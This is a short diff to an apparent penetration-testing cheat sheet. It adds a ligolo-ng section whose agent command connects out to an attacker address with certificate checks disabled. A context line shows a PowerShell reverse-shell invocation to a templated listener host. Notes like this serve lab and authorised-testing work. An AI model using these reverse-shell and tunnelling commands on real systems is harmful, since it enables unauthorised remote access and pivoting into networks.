@@ -200,6 +200,14 @@ Invoke-PowerShellTcp -Reverse -IPAddress <% tp.frontmatter["LHOST"] %> -Port <LP
 
 ```
 
+## ligolo-ng
+```bash
+.\agent.exe -connect 192.168.45.176:11601 -ignore-cert
+
+```
+
+
+
 ## File Sharing
 ```bash
 ## File Sharing
